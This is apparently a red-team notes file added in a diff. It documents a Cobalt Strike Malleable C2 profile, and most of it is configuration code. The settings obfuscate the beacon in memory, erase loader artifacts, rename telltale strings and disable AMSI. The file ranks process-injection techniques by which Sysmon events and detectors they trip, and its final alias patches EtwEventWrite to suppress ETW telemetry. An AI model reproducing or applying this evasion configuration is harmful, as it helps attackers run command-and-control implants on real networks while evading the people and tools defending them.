@@ -1,0 +1,112 @@
+### CS Profile Templates
+- https://github.com/threatexpress/malleable-c2/tree/master
+
+### Profile Configuration
+#### Process Injection 
+- [Process Injection CS Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_process-injection.htm?Highlight=execute%7B)
+- https://boschko.ca/cobalt-strike-process-injection/
+
+```json copy showLineNumbers {53}
+# Memory permissions and cleanup
+stage {
+
+    set userwx "false";
+    
+    # Enables sleep obfuscate, It only obfuscates the beacon itself, It does nothing for the artifacts that got the beacon into memory in the firstp place
+    set sleep_mask "true";  
+
+    # Cleans the self bootstraping reflective dll package that loaded the beacon payload into memory the first place
+    set cleanup "true";
+    
+    # Make the image size bigger than Its usual
+    set image_size_x86 "512000";
+    set image_size_x64 "512000";
+
+    # Set the minimum size that will be allocated in the remote process memory
+    set min_alloc "512000"
+    # Change strings in Memory
+    transform-x86{
+        strrep "This program cannot be run" "Blablabla";
+
+        # this is an exported function, so we can change methods names as well using this way
+        strrep "ReflectiveLoader" "DoSomeStuff";
+
+        # Inject some no op bytes before the PE header
+        prepend "\x90\x90\x90\x90";
+    }
+
+    transform-x64{
+        strrep "This program cannot be run" "Blablabla";
+
+        # this is an exported function, so we can change methods names as well using this way
+        strrep "ReflectiveLoader" "DoSomeStuff";
+
+        # Inject some no-op bytes before the PE header
+        prepend "\x90\x90\x90\x90";
+    }
+
+}
+
+# This is where we can control all the process injection behaviours
+process-inject {
+    # Set memory for BOF as rw instead of rwx
+    set startrwx "false";
+    
+    # Set memory of BOF as rx when executing the BOF instead of rwx
+    set userwx "false";
+
+    # Zero out / Clean the memory of the BOF after execution
+    set bof_reuse_memory "false";
+
+    # specify how we execute code in the remote process
+    # Un comment the methods you want the beacon to choose from, The order is important! Each step will be attempted (if applicable) until successful
+    execute {
+        ## self-injection Injects in the same process of the beacon (the calling process).
+        # Use [function] “module!function+0x##” to specify the start address to spoof. For remote processes, ntdll and kernel32 are the only recommended modules to pull from. The optional 0x## part is an offset added to the start address.
+        CreateThread "ntdll!RtlUserThreadStart+0x42";
+        CreateThread;
+
+        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
+        # OPSEC - when you use SetThreadContext; your thread will have a start address that reflects the original execution entry point of the temporary process.
+        # Meaning that when you modify the context of the thread using SetThreadContext, you can set the instruction pointer (EIP) to point to the original entry point of the remote process that you injected into. In other words, you can set the EIP to the memory address where the legitimate code of the target process would typically start executing when it is launched normally.
+        SetThreadContext;
+        NtQueueApcThread-s;
+        
+        ## Injection into existing processes
+        # OPSEC Uses RWX stub - Detected by Get-InjectedThread. Less detected by some defensive products.
+        NtQueueApcThread; 
+        
+        # CreateRemotThread - Vanilla cross process injection technique. Doesn't cross session boundaries
+        # OPSEC - fires Sysmon Event 8
+        CreateRemoteThread;
+        
+        # Injection across session boundaries
+        # OPSEC - fires Sysmon Event 8. Uses Meterpreter implementation and RWX stub - Detected by Get-InjectedThread
+        RtlCreateUserThread; 
+        }
+}
+
+post-ex {
+        # Disable AMSI
+        set amsi_disable "true";
+
+        # Spawnto
+        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+
+        # change the smb pipe names of SMB to anything random
+        set pipename "totally_not_beacon, legitPipe##";
+}
+
+# $1 - the id for the beacon
+# $2 - the cmdlet and arguments
+# $3 - [optional] if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command
+# $4 - [optional] PATCHES
+alias powerpick-patched {
+   bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
+}
+# Then we can use beacon> assembly-patched C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+# The same for powerpick 
+
+
+```
